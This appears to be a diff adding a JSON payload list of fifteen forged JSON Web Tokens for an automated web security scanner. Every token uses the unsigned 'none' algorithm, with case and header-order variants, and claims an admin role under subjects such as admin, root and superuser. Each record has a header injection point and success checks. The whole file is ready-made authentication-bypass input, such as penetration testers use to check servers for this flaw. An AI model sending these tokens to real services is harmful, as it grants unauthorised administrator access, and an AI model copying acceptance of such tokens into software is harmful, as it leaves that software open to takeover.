@@ -1,0 +1,167 @@
+[
+  {
+    "payload_id": "OWP-66920",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66921",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66922",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66923",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJyb290Iiwicm9sZSI6ImFkbWluIn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66924",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJyb290Iiwicm9sZSI6ImFkbWluIn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66925",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJyb290Iiwicm9sZSI6ImFkbWluIn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66926",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJzdXBlcnVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66927",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJzdXBlcnVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66928",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJzdXBlcnVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66929",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66930",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66931",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66932",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ7XCJhZG1pblwiOnRydWV9Iiwicm9sZSI6ImFkbWluIn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66933",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ7XCJhZG1pblwiOnRydWV9Iiwicm9sZSI6ImFkbWluIn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  },
+  {
+    "payload_id": "OWP-66934",
+    "vulnerability_category": "Cryptographic Failures (JWT None Alg)",
+    "target_technology": "JWT",
+    "injection_point": "header",
+    "payload_string": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJ7XCJhZG1pblwiOnRydWV9Iiwicm9sZSI6ImFkbWluIn0.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|role|sub"
+    }
+  }
+]
